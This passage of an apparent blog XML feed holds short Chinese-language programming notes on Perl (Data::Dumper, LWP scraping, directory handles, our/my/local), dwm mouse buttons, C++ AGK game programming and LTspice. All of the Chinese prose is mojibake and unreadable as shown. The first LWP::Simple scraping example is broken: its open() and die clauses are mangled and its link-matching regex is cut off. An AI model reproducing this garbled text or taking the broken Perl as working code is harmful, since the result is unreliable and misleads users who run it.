çš„ Dumper() å‡½æ•°ï¼Œå°±å¯ä»¥å°†å¼•ç”¨ä¸­æ‰€æœ‰çš„å±‚çº§å…³ç³»è¾“å‡ºåˆ°æ ‡å‡†è¾“<br>å‡ºä¸­ã€‚</p><h1 id="æ˜¾ç¤ºæ‰€æœ‰å¼•ç”¨çš„å±‚çº§å…³ç³»"><a href="#æ˜¾ç¤ºæ‰€æœ‰å¼•ç”¨çš„å±‚çº§å…³ç³»" class="headerlink" title="æ˜¾ç¤ºæ‰€æœ‰å¼•ç”¨çš„å±‚çº§å…³ç³»"></a>æ˜¾ç¤ºæ‰€æœ‰å¼•ç”¨çš„å±‚çº§å…³ç³»</h1><p>ä¾‹å¦‚ï¼š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"> <span class="hljs-keyword">use</span> Data::Dumper;<br><br> <span class="hljs-keyword">my</span> $ref = &#123;<br>    <span class="hljs-string">&#x27;foo&#x27;</span> =&gt; <span class="hljs-string">&#x27;bar&#x27;</span>,<br>    <span class="hljs-string">&#x27;baz&#x27;</span> =&gt; [ <span class="hljs-string">&#x27;quux&#x27;</span>, &#123; <span class="hljs-string">&#x27;quuux&#x27;</span> =&gt; <span class="hljs-string">&#x27;quuuux&#x27;</span> &#125; ]<br>&#125;;<br><br><span class="hljs-keyword">print</span> Dumper($ref);<br><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dart">$VAR1 = &#123;<br>          <span class="hljs-string">&#x27;baz&#x27;</span> =&gt; [<br>                     <span class="hljs-string">&#x27;quux&#x27;</span>,<br>                     &#123;<br>                       <span class="hljs-string">&#x27;quuux&#x27;</span> =&gt; <span class="hljs-string">&#x27;quuuux&#x27;</span><br>                     &#125;<br>                   ],<br>          <span class="hljs-string">&#x27;foo&#x27;</span> =&gt; <span class="hljs-string">&#x27;bar&#x27;</span><br>        &#125;;<br></code></pre></td></tr></table></figure><h1 id="çˆ¬è™«"><a href="#çˆ¬è™«" class="headerlink" title="çˆ¬è™«"></a>çˆ¬è™«</h1><p>å¯ä»¥è€ƒè™‘ <code>LWP</code> æ¨¡å—ä¸­çš„ <code>LWP::Simple</code> å’Œ <code>LWP::UserAgent</code> æ¨¡å—.</p><p>å¦‚ä½¿ç”¨ <code>LWP::Simple</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><br><span class="hljs-keyword">use</span> strict;<br><span class="hljs-keyword">use</span> warnings;<br><span class="hljs-keyword">use</span> LWP::Simple;<br><br><span class="hljs-keyword">my</span> $url = <span class="hljs-string">&quot;http://example.com&quot;</span>;<br><span class="hljs-keyword">my</span> $content = get($url);<br><br><span class="hljs-comment"># å°†é¡µé¢å†…å®¹ä¿å­˜åˆ°æ–‡ä»¶</span><br><span class="hljs-keyword">open</span>(<span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;example.html</span><br><span class="hljs-string">&#x27;</span>example.html<span class="hljs-string">&#x27; $!&quot;;</span><br><span class="hljs-string">print $fh $content;</span><br><span class="hljs-string">close $fh;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># ä»æ–‡ä»¶ä¸­æå–é“¾æ¥</span><br><span class="hljs-string">open(my $fh, &#x27;</span>&lt;<span class="hljs-string">&#x27;, &#x27;</span>example.html<br><span class="hljs-string">&#x27;example.html&#x27;</span> $!<span class="hljs-string">&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">while (my $line = &lt;$fh&gt;) &#123;</span><br><span class="hljs-string">    if ($line =~ m/&lt;a\s+(?:[^&gt;]</span><br><span class="hljs-string">        print &quot;</span>$1\n<span class="hljs-string">&quot;;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">close $fh;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>LWP::UserAgent</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><br><span class="hljs-keyword">use</span> strict;<br><span class="hljs-keyword">use</span> warnings;<br><br><span class="hljs-keyword">use</span> LWP::UserAgent;<br><br><span class="hljs-keyword">my</span> $url = <span class="hljs-string">&#x27;http://example.com&#x27;</span>;<br><br><span class="hljs-keyword">my</span> $ua = LWP::UserAgent-&gt;new;<br><span class="hljs-keyword">my</span> $response = $ua-&gt;get($url);<br><br><span class="hljs-keyword">if</span> ($response-&gt;is_success) &#123;<br>    <span class="hljs-keyword">my</span> $content = $response-&gt;decoded_content;<br>    <span class="hljs-comment"># do something with the content</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span> $response-&gt;status_line;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="å¤„ç†-HTML"><a href="#å¤„ç†-HTML" class="headerlink" title="å¤„ç† HTML"></a>å¤„ç† HTML</h1><p>å¯ä»¥ä½¿ç”¨ <code>HTML::TokeParser</code> æ¨¡å—</p><h1 id="åˆ›å»ºå­è¿›ç¨‹"><a href="#åˆ›å»ºå­è¿›ç¨‹" class="headerlink" title="åˆ›å»ºå­è¿›ç¨‹"></a>åˆ›å»ºå­è¿›ç¨‹</h1><p>ä½¿ç”¨ <code>fork()</code> , çˆ¶è¿›ç¨‹ä¼šå…ˆè¿è¡Œ, ç„¶ä¼šå†è¿è¡Œå­è¿›ç¨‹.</p><p>å­è¿›ç¨‹åªä¼šå¤åˆ¶ <code>fork()</code> è¯­å¥ä¹‹åçš„ç¨‹åº.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-dwm-statuscmd-å…³äºé¼ æ ‡çš„ä¿¡å·</title>
    <link href="/2022/10/27/%E5%85%B3%E4%BA%8E-dwm-statuscmd-%E5%85%B3%E4%BA%8E%E9%BC%A0%E6%A0%87%E7%9A%84%E4%BF%A1%E5%8F%B7/"/>
    <url>/2022/10/27/%E5%85%B3%E4%BA%8E-dwm-statuscmd-%E5%85%B3%E4%BA%8E%E9%BC%A0%E6%A0%87%E7%9A%84%E4%BF%A1%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<p>Button1 æ˜¯é¼ æ ‡å·¦é”®ç‚¹å‡».</p><p>Button2 æ˜¯é¼ æ ‡ä¸­é”®ç‚¹å‡».</p><p>Button3 æ˜¯é¼ æ ‡å³é”®ç‚¹å‡».</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C++ æ¸¸æˆä¸å›¾å½¢ç¼–ç¨‹</title>
    <link href="/2022/10/26/C++%20%E6%B8%B8%E6%88%8F%E4%B8%8E%E5%9B%BE%E5%BD%A2%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/10/26/C++%20%E6%B8%B8%E6%88%8F%E4%B8%8E%E5%9B%BE%E5%BD%A2%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬2ç« "><a href="#ç¬¬2ç« " class="headerlink" title="ç¬¬2ç« "></a>ç¬¬2ç« </h1><p><code>endl</code> (end line) æ“ä½œç¬¦, å¯ç”¨äºè¦æ±‚æ¢è¡Œ.</p><p>ä»»ä½•è¦ç”¨ <code>cout</code> æ˜¾ç¤ºè¾“å‡ºçš„ç¨‹åºéƒ½å¿…é¡»åŒ…å« <code>iostream</code> å¤´æ–‡ä»¶.</p><h2 id="2-5-è¯»å–é”®ç›˜è¾“å…¥"><a href="#2-5-è¯»å–é”®ç›˜è¾“å…¥" class="headerlink" title="2.5 è¯»å–é”®ç›˜è¾“å…¥"></a>2.5 è¯»å–é”®ç›˜è¾“å…¥</h2><p>ç”¨ <code>cin</code>.</p><h2 id="2-9-æ ‡å‡†åº“çš„æ•°å­¦å‡½æ•°"><a href="#2-9-æ ‡å‡†åº“çš„æ•°å­¦å‡½æ•°" class="headerlink" title="2.9 æ ‡å‡†åº“çš„æ•°å­¦å‡½æ•°"></a>2.9 æ ‡å‡†åº“çš„æ•°å­¦å‡½æ•°</h2><p>å¦‚:<br><img src="/../img/C++_math.jpg"></p><h2 id="2-10-ä½¿ç”¨å­—ç¬¦ä¸²"><a href="#2-10-ä½¿ç”¨å­—ç¬¦ä¸²" class="headerlink" title="2.10 ä½¿ç”¨å­—ç¬¦ä¸²"></a>2.10 ä½¿ç”¨å­—ç¬¦ä¸²</h2><p>ä½¿ç”¨æ ‡å‡†åº“çš„ string ç±»æ¥åˆ›å»ºèƒ½å®¹çº³å­—ç¬¦ä¸²çš„å¯¹è±¡.</p><p>éœ€è¦åŒ…å« <code>string</code> å¤´æ–‡ä»¶.</p><h1 id="ç¬¬3ç« "><a href="#ç¬¬3ç« " class="headerlink" title="ç¬¬3ç« "></a>ç¬¬3ç« </h1><h2 id="3-8-æ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#3-8-æ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="3.8 æ¯”è¾ƒå­—ç¬¦ä¸²"></a>3.8 æ¯”è¾ƒå­—ç¬¦ä¸²</h2><p>ç”¨ <code>==</code> å’Œ <code>!=</code>.</p><h1 id="ç¬¬5ç« "><a href="#ç¬¬5ç« " class="headerlink" title="ç¬¬5ç« "></a>ç¬¬5ç« </h1><h3 id="5-6-2-bool-å‡½æ•°"><a href="#5-6-2-bool-å‡½æ•°" class="headerlink" title="5.6.2 bool å‡½æ•°"></a>5.6.2 bool å‡½æ•°</h3><p>bool å‡½æ•°è¿”å› true æˆ– false.</p><h2 id="5-7-è°ƒç”¨-string-ç±»çš„æˆå‘˜å‡½æ•°"><a href="#5-7-è°ƒç”¨-string-ç±»çš„æˆå‘˜å‡½æ•°" class="headerlink" title="5.7 è°ƒç”¨ string ç±»çš„æˆå‘˜å‡½æ•°"></a>5.7 è°ƒç”¨ string ç±»çš„æˆå‘˜å‡½æ•°</h2><p>ä½¿ç”¨ <code>length()</code> æˆå‘˜å‡½æ•°å¯ä»¥çŸ¥é“é•¿åº¦.</p><h1 id="ç¬¬7ç« "><a href="#ç¬¬7ç« " class="headerlink" title="ç¬¬7ç« "></a>ç¬¬7ç« </h1><h3 id="7-1-2-app-Loop-å‡½æ•°æ˜¯è‡ªåŠ¨å¾ªç¯çš„"><a href="#7-1-2-app-Loop-å‡½æ•°æ˜¯è‡ªåŠ¨å¾ªç¯çš„" class="headerlink" title="7.1.2 app::Loop å‡½æ•°æ˜¯è‡ªåŠ¨å¾ªç¯çš„"></a>7.1.2 app::Loop å‡½æ•°æ˜¯è‡ªåŠ¨å¾ªç¯çš„</h3><p>AGK ç¨‹åºçš„ <code>app::Loop</code> å‡½æ•°æ˜¯è‡ªåŠ¨é‡å¤æ‰§è¡Œçš„. æ”¾åˆ° <code>app::Loop</code> å‡½æ•°ä¸­çš„è¯­å¥ä¼šä¸€ç›´æ‰§è¡Œ, çŸ¥é“æ¸¸æˆç»“æŸæˆ–ç”¨æˆ·ç»ˆæ­¢ç¨‹åº.</p><h2 id="7-3-æ˜¾ç¤ºç²¾çµ"><a href="#7-3-æ˜¾ç¤ºç²¾çµ" class="headerlink" title="7.3 æ˜¾ç¤ºç²¾çµ"></a>7.3 æ˜¾ç¤ºç²¾çµ</h2><h3 id="7-3-1-ä½å›¾å›¾åƒ"><a href="#7-3-1-ä½å›¾å›¾åƒ" class="headerlink" title="7.3.1 ä½å›¾å›¾åƒ"></a>7.3.1 ä½å›¾å›¾åƒ</h3><p>ç£ç›˜ä¸Šå­˜å‚¨çš„å›¾åƒä¸€èˆ¬æ˜¯ä½å›¾æ ¼å¼, ä½å›¾æ˜¯å¯¹å›¾åƒä¸­çš„æ¯ä¸ªåƒç´ éƒ½è¿›è¡Œæè¿°çš„ä¸€ç»„æ•°æ®. åœ¨ç£ç›˜ä¸Šå­˜å‚¨ä½å›¾æ–‡ä»¶æ—¶, æ–‡ä»¶ä¸­åŒ…å«æ¯ä¸ªåƒç´ çš„æè¿°æ•°æ®.</p><h3 id="7-3-2-ç²¾çµ"><a href="#7-3-2-ç²¾çµ" class="headerlink" title="7.3.2 ç²¾çµ"></a>7.3.2 ç²¾çµ</h3><p>ç”µè„‘æ¸¸æˆæ˜¾ç¤ºçš„å›¾åƒé€šå¸¸ç§°ä¸ºç²¾çµ (sprite).</p><p>AGK ç¨‹åºç”¨ agk::CreateSprite å‡½æ•°åˆ›å»ºç²¾çµ.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">agk::<span class="hljs-built_in">CreateSprite</span>( SpriteIndex , ImageFile );<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªå‚æ•°:</p><ul><li><code>SpriteIndex</code> æ˜¯ç²¾çµç´¢å¼•, æ˜¯åœ¨ç¨‹åºä¸­æ ‡è¯†ç²¾çµçš„ç¼–å·, èŒƒå›´åœ¨ 1 åˆ° 4294967295 ä¹‹é—´. ä¸€æ—¦åˆ›å»ºç²¾çµ, åç»­æ“ä½œå°±ç”¨è¿™ä¸ªç¼–å·æ¥è¯†åˆ«å®ƒ.</li><li><code>ImageFile</code> æ˜¯åŒ…å«å›¾çš„æ–‡ä»¶å, å¯ä»¥æ˜¯ <code>.png</code>, <code>.jpg</code>, æˆ– <code>.bmp</code> æ ¼å¼</li></ul><p>ç²¾çµçš„é»˜è®¤ä½ç½®æ˜¯å·¦ä¸Šè§’ <code>(0,0)</code>.</p><h3 id="7-3-4-ç†è§£åå°ç¼“å†²åŒºå’ŒåŒæ­¥"><a href="#7-3-4-ç†è§£åå°ç¼“å†²åŒºå’ŒåŒæ­¥" class="headerlink" title="7.3.4 ç†è§£åå°ç¼“å†²åŒºå’ŒåŒæ­¥"></a>7.3.4 ç†è§£åå°ç¼“å†²åŒºå’ŒåŒæ­¥</h3><p><code>agk::Sync</code> å‡½æ•°è¦åœ¨ <code>app::Loop</code> å‡½æ•°ä¸­è°ƒç”¨, è€Œä¸”ä¸€èˆ¬æ˜¯ <code>app::Loop</code> ä¸­æ‰§è¡Œçš„æœ€åä¸€ä¸ªæ“ä½œ.</p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨-Linux-ä¸Šä¸‹è½½-AGK-C++-åº“</title>
    <link href="/2022/10/26/%E5%9C%A8-Linux-%E4%B8%8A%E4%B8%8B%E8%BD%BD-AGK-C++-%E5%BA%93/"/>
    <url>/2022/10/26/%E5%9C%A8-Linux-%E4%B8%8A%E4%B8%8B%E8%BD%BD-AGK-C++-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p>ç”¨ <code>wget</code> ä¸‹è½½:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget http://fstore.thegamecreators.com/AppGameKit/AppGameKit-Trial-Linux.7z<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ltspice-æŸ¥çœ‹å„ä¸ªç‚¹çš„ç”µåŠ¿å’Œç”µæµ</title>
    <link href="/2022/10/26/ltspice-%E6%9F%A5%E7%9C%8B%E5%90%84%E4%B8%AA%E7%82%B9%E7%9A%84%E7%94%B5%E5%8A%BF%E5%92%8C%E7%94%B5%E6%B5%81/"/>
    <url>/2022/10/26/ltspice-%E6%9F%A5%E7%9C%8B%E5%90%84%E4%B8%AA%E7%82%B9%E7%9A%84%E7%94%B5%E5%8A%BF%E5%92%8C%E7%94%B5%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆéœ€è¦åˆ é™¤ä¹‹å‰è®¾å®šçš„ <code>run</code> çš„å‚æ•°, ç”¨å‰ªåˆ€å‰ªæ‰å³å¯, ç„¶åç‚¹å‡» <code>run</code>, é€‰æ‹©æœ€åçš„ <code>DC op pnt</code> å³å¯.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-è‡ªå¸¦çš„æ‰‹å†Œ</title>
    <link href="/2022/10/26/Perl-%E8%87%AA%E5%B8%A6%E7%9A%84%E6%89%8B%E5%86%8C/"/>
    <url>/2022/10/26/Perl-%E8%87%AA%E5%B8%A6%E7%9A%84%E6%89%8B%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/u011729865/article/details/52680236">å‚è€ƒ</a></p><p>æŸ¥çœ‹æœ‰é‚£äº›æ‰‹å†Œå¯ä»¥ç”¨ <code>perldoc perl</code> å‘½ä»¤.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-ä¸­çš„-readdir</title>
    <link href="/2022/10/25/Perl-%E4%B8%AD%E7%9A%84-readdir/"/>
    <url>/2022/10/25/Perl-%E4%B8%AD%E7%9A%84-readdir/</url>
    
    <content type="html"><![CDATA[<p>å…·ä½“å¯æŸ¥çœ‹ <code>perlfunc</code> ä¸­çš„å†…å®¹.</p><p>åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­è¿”å›ç›®å½•ä¸‹çš„å…¨éƒ¨å†…å®¹, åœ¨æ ‡é‡ä¸Šä¸‹æ–‡å¯ä»¥é€šè¿‡ <code>while</code> å¾ªç¯æ¥è·å–å…¨éƒ¨å†…å®¹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">my</span> $content = <span class="hljs-keyword">readdir</span> $dh) &#123;<br>    <span class="hljs-keyword">print</span> $content;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-ä¸­å…³äº-grep-å’Œ-map-çš„é…åˆä½¿ç”¨</title>
    <link href="/2022/10/25/Perl-%E4%B8%AD%E5%85%B3%E4%BA%8E-grep-%E5%92%8C-map-%E7%9A%84%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/25/Perl-%E4%B8%AD%E5%85%B3%E4%BA%8E-grep-%E5%92%8C-map-%E7%9A%84%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>å¯ä»¥å°† <code>grep</code> çš„ç»“æœç›´æ¥ä½œä¸º <code>map</code> çš„è¾“å…¥ä½¿ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @dir_hs = <span class="hljs-keyword">map</span> &#123; <span class="hljs-keyword">opendir</span> <span class="hljs-keyword">my</span> $dh, $_; $dh &#125; <span class="hljs-keyword">grep</span> &#123; -d &#125; @ARGV;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Perl-ä¸­å¯¹äºå¥æŸ„çš„æ£€æŸ¥</title>
    <link href="/2022/10/25/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD%E5%AF%B9%E4%BA%8E%E5%8F%A5%E6%9F%84%E7%9A%84%E6%A3%80%E6%9F%A5/"/>
    <url>/2022/10/25/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD%E5%AF%B9%E4%BA%8E%E5%8F%A5%E6%9F%84%E7%9A%84%E6%A3%80%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ä½¿ç”¨ <code>opendir</code> æ—¶, éœ€è¦æ£€æŸ¥å…¶æ˜¯å¦ä¸ºç›®å½•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @not_dirs = <span class="hljs-keyword">grep</span> &#123; ! -d &#125; @ARGV;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-åˆ¤æ–­ä¸€ä¸ªå“ˆå¸Œé”®å€¼å¯¹æ˜¯å¦å­˜åœ¨å¹¶æ·»åŠ </title>
    <link href="/2022/10/25/Perl-%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E5%93%88%E5%B8%8C%E9%94%AE%E5%80%BC%E5%AF%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%B9%B6%E6%B7%BB%E5%8A%A0/"/>
    <url>/2022/10/25/Perl-%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E5%93%88%E5%B8%8C%E9%94%AE%E5%80%BC%E5%AF%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%B9%B6%E6%B7%BB%E5%8A%A0/</url>
    
    <content type="html"><![CDATA[<p>å¸¸å¸¸è¿™æ ·åˆ¤æ–­, å¹¶æ·»åŠ æ²¡æœ‰çš„é”®å€¼å¯¹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unless</span> ( $output_handles&#123;$name&#125; ) &#123;<br>    <span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&quot;$name.info&quot;</span><br>        <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot create $name.info: $!&quot;</span>;<br>    $output_handles&#123;$name&#125; = $fh;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è·å–-Perl-ä¸­-localtime-ä¸­çš„æŸä¸ªå€¼</title>
    <link href="/2022/10/25/%E8%8E%B7%E5%8F%96-Perl-%E4%B8%AD-localtime-%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%AA%E5%80%BC/"/>
    <url>/2022/10/25/%E8%8E%B7%E5%8F%96-Perl-%E4%B8%AD-localtime-%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%AA%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$day_of_week = (<span class="hljs-keyword">localtime</span>)[<span class="hljs-number">6</span>];<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-ä¸­çš„-our-my-local-å’Œ-state</title>
    <link href="/2022/10/24/Perl-%E4%B8%AD%E7%9A%84-our-my-local-%E5%92%8C-state/"/>
    <url>/2022/10/24/Perl-%E4%B8%AD%E7%9A%84-our-my-local-%E5%92%8C-state/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>our</code> å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Cow;    <br><span class="hljs-keyword">our</span> @ISA = <span class="hljs-string">qw(Animal)</span>;<br></code></pre></td></tr></table></figure><p>å°±ç­‰ä»·äº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">@Cow::ISA = <span class="hljs-string">qw(Animal)</span>;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨è¿™ä¸ªå˜é‡æ—¶ï¼Œå‰é¢ä¸ç”¨åŠ åŒ…å.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Perl-çš„å·¥ä½œç›®å½•</title>
    <link href="/2022/10/23/%E5%85%B3%E4%BA%8E-Perl-%E7%9A%84%E5%B7%A5%E4%BD%9C%E7%9B%AE%E5%BD%95/"/>
    <url>/2022/10/23/%E5%85%B3%E4%BA%8E-Perl-%E7%9A%84%E5%B7%A5%E4%BD%9C%E7%9B%AE%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>ä¼¼ä¹æ˜¯ä½ åœ¨å“ªä¸ªç›®å½•ä¸‹æ‰§è¡Œè¿™ä¸ªç¨‹åº, é»˜è®¤çš„å·¥ä½œç›®å½•å°±æ˜¯å“ªé‡Œ.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Perl-ä»æ–‡ä»¶å¥æŸ„ä¸­è·å–å†…å®¹</title>
    <link href="/2022/10/22/%E5%85%B3%E4%BA%8E-Perl-%E4%BB%8E%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9/"/>
    <url>/2022/10/22/%E5%85%B3%E4%BA%8E-Perl-%E4%BB%8E%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<p>ä¸ç®¡æ˜¯ä»æ ‡å‡†è¾“å…¥è¿˜æ˜¯ä»æ–‡ä»¶ä¸­è·å–, perl éƒ½ä¸ä¼šè‡ªåŠ¨å»é™¤æ¢è¡Œç¬¦.</p><p>è¦åˆ¤æ–­è¾“å…¥ä¸ºç©ºæ—¶é€€å‡º, éœ€è¦ç”¨åˆ° <code>chomp()</code> æ¥å»é™¤æ¢è¡Œç¬¦.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Perl-çš„-File::Spec-æ¨¡å—</title>
    <link href="/2022/10/20/%E5%85%B3%E4%BA%8E-Perl-%E7%9A%84-File::Spec-%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/10/20/%E5%85%B3%E4%BA%8E-Perl-%E7%9A%84-File::Spec-%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<p>File::Spec æ¨¡å—æ˜¯ object oriented.</p><p>ä¸»è¦æœ‰è¿æ¥å¤šä¸ªåç§°ä¸ºä¸€ä¸ª full path çš„æ–¹æ³•.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-è¿›é˜¶-Notes</title>
    <link href="/2022/10/20/Perl-%E8%BF%9B%E9%98%B6-Notes/"/>
    <url>/2022/10/20/Perl-%E8%BF%9B%E9%98%B6-Notes/</url>
    
